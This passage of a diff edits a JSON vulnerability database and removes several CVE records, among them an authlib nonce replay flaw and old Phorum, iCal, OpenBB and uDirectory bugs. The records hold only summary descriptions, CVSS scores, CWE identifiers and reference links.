arbitrary subject. It removes the replay protection from a genuine token that has been captured, for example from browser history, a `Referer` header, proxy or server logs, or a shared device.\n\n## Mitigation available to integrators\n\nNone. The check is performed inside `parse_id_token()`, and no parameter or configuration option is exposed to disable the behaviour or to override the nonce handling.",
-      "cvssScore": 5.2,
-      "severity": "Medium",
-      "published": "2026-10-22",
-      "modified": "2026-10-30",
-      "cwe": {
-        "cwe_id": "CWE-294",
-        "name": "Authentication Bypass by Capture-replay"
-      },
-      "references": [
-        "https://github.com/authlib/authlib/releases/tag/v1.9.0",
-        "https://github.com/authlib/authlib/commit/6563f6f7a8c2f71d2f85ee7511d72a4fbae3acc0",
-        "https://github.com/authlib/authlib/pull/949",
-        "https://github.com/authlib/authlib/security/advisories/GHSA-c5mf-xmp2-59rc"
-      ],
-      "vulnerableProducts": [
-        "authlib PyPI"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-1464",
-      "summary": "Buffer overflow in Siemens 45 series mobile phones allows remote attackers to cause a denial of service (disconnect and unavailable inbox) via a Short Message Service (SMS) message with a long image name.",
-      "cvssScore": 7.8,
-      "severity": "High",
-      "published": "2003-12-31",
-      "modified": null,
-      "cwe": "CWE-119",
-      "references": [
-        "http://securityreason.com/securityalert/3287",
-        "http://www.securityfocus.com/archive/1/320555",
-        "http://www.securityfocus.com/bid/7507",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/11950",
-        "http://securityreason.com/securityalert/3287"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-1465",
-      "summary": "Directory traversal vulnerability in download.php in Phorum 3.4 through 3.4.2 allows remote attackers to read arbitrary files.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2003-12-31",
-      "modified": null,
-      "cwe": "CWE-22",
-      "references": [
-        "http://securityreason.com/securityalert/3288",
-        "http://www.securityfocus.com/archive/1/321310",
-        "http://www.securityfocus.com/bid/7569",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/12482",
-        "http://securityreason.com/securityalert/3288"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1072",
-      "summary": "iCal 2.1 Patch 2 installs many files with world-writeable permissions, which allows local users to modify the iCal configuration and execute arbitrary commands by replacing the iplncal.sh program with a Trojan horse.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2000-12-11",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.atstake.com/research/advisories/2000/a100900-1.txt",
-        "http://www.osvdb.org/7212",
-        "http://www.securityfocus.com/bid/1768",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5756",
-        "http://www.atstake.com/research/advisories/2000/a100900-1.txt"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1073",
-      "summary": "csstart program in iCal 2.1 Patch 2 searches for the cshttpd program in the current working directory, which allows local users to gain root privileges by creating a Trojan Horse cshttpd program in a directory and calling csstart from that directory.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2000-12-11",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.atstake.com/research/advisories/2000/a100900-1.txt",
-        "http://www.osvdb.org/7210",
-        "http://www.securityfocus.com/bid/1769",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5757",
-        "http://www.atstake.com/research/advisories/2000/a100900-1.txt"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1074",
-      "summary": "csstart program in iCal 2.1 Patch 2 uses relative pathnames to install the libsocket and libnsl libraries, which could allow the icsuser account to gain root privileges by creating a Trojan Horse library in the current or parent directory.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2000-12-11",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.atstake.com/research/advisories/2000/a100900-1.txt",
-        "http://www.osvdb.org/7209",
-        "http://www.securityfocus.com/bid/1769",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5757",
-        "http://www.atstake.com/research/advisories/2000/a100900-1.txt"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1075",
-      "summary": "Directory traversal vulnerability in iPlanet Certificate Management System 4.2 and Directory Server 4.12 allows remote attackers to read arbitrary files via a .. (dot dot) attack in the Agent, End Entity, or Administrator services.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2000-12-11",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-10/0383.html",
-        "http://www.iplanet.com/downloads/patches/0122.html",
-        "http://www.osvdb.org/4086",
-        "http://www.osvdb.org/486",
-        "http://www.securityfocus.com/bid/1839"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-92364",
-      "summary": "A vulnerability has been found in itsourcecode Leave Management System 1.0. Affected by this vulnerability is an unknown functionality of the file /module/employee/index.php. The manipulation of the argument ID leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.",
-      "cvssScore": 5.3,
-      "severity": "Medium",
       "published": "2026-09-16",
       "modified": "2026-09-16",
       "cwe": null,
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-92364",
-        "https://github.com/KissPrincess/OguriCap/issues/1",
-        "https://itsourcecode.com",
-        "https://vuldb.com/cve/CVE-2026-92364",
-        "https://vuldb.com/submit/934982"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-1830",
-      "summary": "Open Bulletin Board (OpenBB) 1.0.0 RC3 allows remote attackers to bypass authentication and access modifier options via a direct request to moderator.php with the action and ismod parameters.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2002-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=vuln-dev&m=102221487407632&w=2",
-        "http://www.iss.net/security_center/static/9160.php",
-        "http://www.securityfocus.com/bid/4823",
-        "http://marc.info/?l=vuln-dev&m=102221487407632&w=2",
-        "http://www.iss.net/security_center/static/9160.php"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-1160",
-      "summary": "udirectory.pl in Microburst Technologies uDirectory 2.0 and earlier allows remote attackers to execute arbitrary commands via shell metacharacters in the category_file field.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2001-06-18",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/archive/1/191829",
-        "http://www.securityfocus.com/bid/2884",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6706",
-        "http://www.securityfocus.com/archive/1/191829",
-        "http://www.securityfocus.com/bid/2884"
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-92139",
+        "https://www.jenkins.io/security/advisory/2026-09-16/#SECURITY-3980"
       ],
       "vulnerableProducts": [],
       "isExploited": false
